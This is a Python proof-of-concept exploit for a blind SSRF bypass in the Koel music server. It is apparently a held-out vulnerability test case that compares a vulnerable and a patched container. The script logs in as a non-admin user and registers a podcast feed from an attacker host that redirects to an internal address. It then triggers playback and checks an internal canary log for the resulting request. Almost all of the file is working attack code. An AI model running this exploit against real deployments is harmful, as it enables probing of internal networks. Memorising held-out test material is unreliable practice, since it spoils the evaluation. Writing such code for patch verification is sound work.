#!/usr/bin/env python3
"""RESIDUAL / BYPASS PoC -- CVE-2026-54491 (HELD OUT).

The V1 fix for CVE-2026-47260 added the per-hop on_redirect validator to ONE fetch leg
(EpisodePlayable). The SIBLING leg -- PodcastService::getStreamableUrl(), the OPTIONS/HEAD
"is this directly streamable?" probe that also runs on every episode play -- kept only the
initial isSafeUrl() check and still follows a cross-host 302 with NO per-hop validation.

So the SAME authenticated non-admin play that is now blocked on the EpisodePlayable leg
still drives an outbound OPTIONS request from Koel to the attacker host (PHP-public
11.0.0.10), which 302-redirects to the internal canary (10.99.0.192). The canary records
the inbound request = blind SSRF into the internal network.

  V1 (phanan/koel:9.3.5, getStreamableUrl: isSafeUrl only, no on_redirect) -> canary HIT.
  V2 (phanan/koel:9.7.1, getStreamableUrl via SafeHttp::getPinnedGuzzleClient per-hop
      validation, commit c264a3d5)                                          -> canary NOT hit.

Detection reads the internal canary's hit-log via `docker compose exec` (the canary has no
host port). Usage: python3 bypass_poc.py --port 39821   # v1 target (39822 = v2)
"""
import argparse
import json
import subprocess
import urllib.request

HERE = __file__.rsplit("/", 1)[0] or "."
CASE_DIR = HERE + "/.."
FEED = "http://11.0.0.10/feed.xml"
EMAIL, PW = "listener@pcb.test", "ListenerPass123"


def http(method, url, data=None, headers=None):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def compose(*args):
    return subprocess.run(["docker", "compose", *args], cwd=CASE_DIR,
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=39821)
    a = ap.parse_args()
    base = f"http://localhost:{a.port}"

    _, b = http("POST", f"{base}/api/me",
                data=json.dumps({"email": EMAIL, "password": PW}).encode(),
                headers={"Content-Type": "application/json", "Accept": "application/json"})
    t = json.loads(b)
    api, audio = t["token"], t["audio-token"]

    _, b = http("POST", f"{base}/api/podcasts", data=json.dumps({"url": FEED}).encode(),
                headers={"Authorization": f"Bearer {api}", "Content-Type": "application/json",
                         "Accept": "application/json"})
    try:
        pid = json.loads(b)["id"]
    except (KeyError, ValueError):
        _, b = http("GET", f"{base}/api/podcasts",
                    headers={"Authorization": f"Bearer {api}", "Accept": "application/json"})
        items = json.loads(b)
        items = items.get("data", items) if isinstance(items, dict) else items
        pid = next(p["id"] for p in items if p.get("url") == FEED)

    _, b = http("GET", f"{base}/api/podcasts/{pid}/episodes",
                headers={"Authorization": f"Bearer {api}", "Accept": "application/json"})
    episode = json.loads(b)[0]["id"]

    compose("exec", "-T", "canary", "sh", "-c", ": > /hits.log")
    st, _ = http("GET", f"{base}/play/{episode}?api_token={audio}")
    hits = compose("exec", "-T", "canary", "sh", "-c", "cat /hits.log").stdout.strip()
    reached = bool(hits)
    print(f"[residual] /play status={st} canary_hits={hits!r}")
    print("RESULT:", "SSRF (getStreamableUrl reached internal canary)" if reached
          else "blocked (canary never reached)")
    return 0 if reached else 1


if __name__ == "__main__":
    raise SystemExit(main())
